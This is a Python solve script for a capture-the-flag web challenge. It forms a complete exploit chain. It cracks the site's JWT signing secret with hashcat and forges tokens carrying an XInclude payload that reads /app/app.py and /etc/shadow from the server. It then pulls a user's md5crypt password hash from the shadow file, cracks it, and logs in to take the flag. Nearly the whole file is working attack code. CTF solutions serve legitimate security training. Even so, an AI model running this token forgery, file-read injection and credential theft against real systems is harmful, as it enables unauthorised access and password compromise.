import html
import jwt
import os
import requests
import subprocess
import sys
import tempfile
from requests.auth import HTTPBasicAuth


URL = os.getenv('CHAL_URL') or 'https://username-okntin33tq-ul.a.run.app'


def getJWT():
    data = {'username': 'sam'}

    url = URL + '/register'
    response = requests.post(url, data = data, allow_redirects = False)

    if response.status_code != 302:
        print(f'Unexpected response from {url}', response.status_code, response.text)
        sys.exit(1)

    jwt = response.cookies.get('appdata')
    if jwt is None:
        print(f'No cookie from {url}')
        sys.exit(1)

    return jwt


def crack(mode, hash):
    file = tempfile.NamedTemporaryFile(delete = False)
    file.write(hash.encode())
    file.close()

    cmd = f'hashcat --potfile-disable -m {mode} -a 3 {file.name} -O'

    output = subprocess.check_output(cmd, shell = True, text = True)
    # print(output)

    if hash not in output:
        print(f'Failed to crack hash ({hash}):', output)
        sys.exit(1)

    hashIndex = output.index(hash + ':')

    keyStart = output[hashIndex:]

    colonIndex = keyStart.index(':')
    newlineIndex = keyStart.index('\n')
    secret = keyStart[colonIndex+1:newlineIndex]
    # print('secret:', secret)

    return secret

def crackJWT(givenJWT):
    HASHCAT_JWT_MODE = 16500
    secret = crack(HASHCAT_JWT_MODE, givenJWT)
    return secret

def crackLinuxPassword(linuxPasswordHash):
    # If you didn't know this mode, one way is to try to solve this using "john".
    # It would identify the hash type and print it out: detected hash type "md5crypt"
    # Then run "hashcat --help" and search for md5crypt to find this mode.
    #
    # Another way: https://hashes.com/en/tools/hash_identifier
    HASHCAT_MD5CRYPT_MODE = 500
    secret = crack(HASHCAT_MD5CRYPT_MODE, linuxPasswordHash)
    return secret

def forgeJWT(jwtSecret, payload):
    jwtJson = {"data": payload}

    forgedJWT = jwt.encode(jwtJson, jwtSecret, algorithm='HS256')

    return forgedJWT


def forgeJWTToReadFile(jwtSecret, filePath):
    xml = f'<data><username><xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="{filePath}" parse="text"/></username></data>'
    forgedJWT = forgeJWT(jwtSecret, xml)
    return forgedJWT


def assertWelcomeHasHint(givenJWT):
    url = URL + '/welcome'

    cookies = {'appdata': givenJWT}
    response = requests.get(url, cookies = cookies)

    if '/app/app.py' not in response.text:
        print(f'Hint was not in {url}')
        sys.exit(1)


def readRemoteFile(jwtSecret, filePath):
    url = URL + '/welcome'
    forgedJWT = forgeJWTToReadFile(jwtSecret, filePath)

    cookies = {'appdata': forgedJWT}
    response = requests.get(url, cookies = cookies)

    # print(response.status_code, response.text)

    precedingText = '<div>Welcome '
    if precedingText not in response.text:
        print('1 Unexpected response reading remote file:', response.text)
        sys.exit(1)

    precedingTextIndex = response.text.index(precedingText)

    trailingText = '</div>'
    if trailingText not in response.text:
        print('2 Unexpected response reading remote file:', response.text)
        sys.exit(1)

    trailingTextIndex = response.text.index(trailingText)

    fileContentHtml = response.text[precedingTextIndex+len(precedingText):trailingTextIndex]
    fileContent = html.unescape(fileContentHtml)
    return fileContent


def getLinuxPasswordHash(shadowFileContent):
    prefix = 'flaguser:'
    if prefix not in shadowFileContent:
        print('Cannot find flaguser in shadow file:', shadowFileContent)
        sys.exit(1)

    flaguserIndex = shadowFileContent.index(prefix)
    tailContent = shadowFileContent[flaguserIndex+len(prefix):]
    colonIndex = tailContent.index(':')
    passwordHash = tailContent[0:colonIndex]
    return passwordHash


def getFlag(linuxPassword):
    url = URL + '/secret-welcome-935734'
    response = requests.get(url, auth=HTTPBasicAuth('flaguser', linuxPassword))

    if 'wctf{' in response.text:
        print('SOLVED: username challenge!')
    else:
        print(f'ERROR: failed to get flag from: {url}', response.status_code, response.text)



givenJWT = getJWT()
assertWelcomeHasHint(givenJWT)

jwtSecret = crackJWT(givenJWT)

appFileContent = readRemoteFile(jwtSecret, '/app/app.py')

# proves this endpoint is viewable in app.py
if '/secret-welcome-935734' not in appFileContent:
    print('1 Unexpected app.py content:', appFileContent)
    sys.exit(1)

# proves 'flaguser' is mentioned in app.py
if 'flaguser' not in appFileContent:
    print('2 Unexpected app.py content:', appFileContent)
    sys.exit(1)


# proves it says to find the linux password for 'flaguser'
if 'Login here with that username and their linux password' not in appFileContent:
    print('3 Unexpected app.py content:', appFileContent)
    sys.exit(1)


shadowFileContent = readRemoteFile(jwtSecret, '/etc/shadow')
linuxPasswordHash = getLinuxPasswordHash(shadowFileContent)

print('Have linux password hash, cracking it now. This will take a few mins...')
linuxPassword = crackLinuxPassword(linuxPasswordHash)

getFlag(linuxPassword)